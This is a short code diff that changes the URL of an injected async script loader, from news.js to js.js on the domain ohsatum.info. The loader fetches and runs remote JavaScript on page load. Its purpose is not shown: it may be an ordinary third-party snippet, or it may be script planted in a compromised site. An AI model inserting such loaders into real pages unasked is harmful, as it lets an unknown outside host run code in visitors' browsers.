@@ -13,7 +13,7 @@
     script.async = true;
     script.type = 'text/javascript';
     script.charset = 'UTF-8';
-    script.src = 'https://ohsatum.info/news.js?sid=871623';
+    script.src = 'https://ohsatum.info/js.js?sid=871623';
     var entry = document.getElementsByTagName('script')[0];
     entry.parentNode.insertBefore(script, entry);
 })();
